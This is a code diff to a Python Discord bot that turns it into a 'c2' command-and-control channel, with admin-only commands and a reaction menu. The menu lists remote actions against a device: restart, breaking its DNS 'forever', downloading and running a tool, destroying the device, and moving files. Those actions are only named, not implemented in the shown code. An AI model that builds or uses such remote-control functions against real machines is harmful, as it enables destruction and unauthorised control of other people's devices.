@@ -272,7 +272,19 @@ def read_key():
 
 
 # All global variables, and required initializations are done here.
-TOKEN, CHANNEL_ID_PCAPS, CHANNEL_ID_LOGS, WEBHOOK_USERNAME, DEBUG = read_key()
+TOKEN, CHANNEL_ID, CHANNEL_ID_LOGS, WEBHOOK_USERNAME, DEBUG = read_key()
+
+MENU = """
+Reactions Menu:
+
+⚙️ -> Restart
+🛜 -> Change DNS to 127.0.0.1 (WARNING: This will disconnect the connection forever!)
+🪝 -> Download Logicytics and run
+📃 -> Send Logicytics Logs
+💣 -> Destroy device
+📤 -> Upload a file of your choice (WIP)
+📥 -> Download a file of your choice (WIP)
+"""
 
 intents = discord.Intents.default()
 bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
@@ -306,43 +318,43 @@ async def on_message(message):
     Returns:
         None
     """
-    channel_pcaps = await message.guild.fetch_channel(CHANNEL_ID_PCAPS)
+    channel_c2 = await message.guild.fetch_channel(CHANNEL_ID)
     channel_log = await message.guild.fetch_channel(CHANNEL_ID_LOGS)
-    if isinstance(channel_pcaps, discord.TextChannel) and isinstance(
-            channel_log, discord.TextChannel
-    ):
-        log.info(f"Message from {message.author}: {message.content}")
-        if message.content == "/logs c2":
-            if (
-                    message.author == message.guild.owner
-                    or message.author.guild_permissions.administrator
-            ):
+    if isinstance(channel_c2, discord.TextChannel) and isinstance(channel_log, discord.TextChannel):
+        if message.author != bot.user:
+            log.info(f"Message from {message.author}: {message.content}")
+        if message.content == "/c2 logs" and message.author != bot.user:
+            if message.author == message.guild.owner or message.author.guild_permissions.administrator:
                 if message.channel.id == CHANNEL_ID_LOGS:
                     await logs(message.channel)
                 else:
-                    await message.channel.send(
-                        "This is not the logs preconfigured channel. Please use the /logs command in the logs channel."
-                    )
-                    log.warning(
-                        f"Channel {message.channel} is not the one preconfigured."
-                    )
+                    await message.channel.send("This is not the logs preconfigured channel. Please use the /logs command in the logs channel.")
+                    log.warning(f"Channel {message.channel} is not the one preconfigured.")
             else:
-                await message.channel.send(
-                    "You do not have permission to use this command?"
-                )
-                log.error(
-                    f"User {message.author} attempted to use the /logs command. Invalid permission's."
-                )
-        elif str(message.author) in WEBHOOK_USERNAME:
+                await message.channel.send("You do not have permission to use this command?")
+                log.error(f"User {message.author} attempted to use the /logs command. Invalid permission's.")
+        if str(message.author) in WEBHOOK_USERNAME and message.author != bot.user:
             pass
-            # await extract_and_decrypt(CHANNEL_ID_PCAPS)
-        elif str(message.author) not in WEBHOOK_USERNAME and message.author != bot.user:
-            log.info(
-                f"Message Ignored due to {message.author} not being in the allowed list of users: {WEBHOOK_USERNAME}"
-            )
+            # use reactions to decide what to do - include logicytics
+        if message.content == "/c2" and message.author != bot.user:
+            if message.author == message.guild.owner or message.author.guild_permissions.administrator:
+                await message.channel.send("/c2 logs -> Retrieves and sends the bots logs to a specified channel.")
+                await message.channel.send("/c2 menu -> Sends possible reaction menu")
+            else:
+                await message.channel.send("You do not have permission to use this command?")
+                log.error(f"User {message.author} attempted to use the /c2 command. Invalid permission's.")
+        if message.content == "/c2 menu" and message.author != bot.user:
+            if message.author == message.guild.owner or message.author.guild_permissions.administrator:
+                await message.channel.send(MENU)
+            else:
+                await message.channel.send("You do not have permission to use this command?")
+                log.error(f"User {message.author} attempted to use the menu command. Invalid permission's.")
+        if str(message.author) not in WEBHOOK_USERNAME or message.author == bot.user:
+            log.info(f"Message Ignored due to {message.author} not being in the allowed list of users: {WEBHOOK_USERNAME}")
+
     else:
         log.critical(
-            f"Channel {CHANNEL_ID_PCAPS} or {CHANNEL_ID_LOGS} not found as text channels. Bot Crashed."
+            f"Channel {CHANNEL_ID} or {CHANNEL_ID_LOGS} not found as text channels. Bot Crashed."
         )
         exit(1)
 
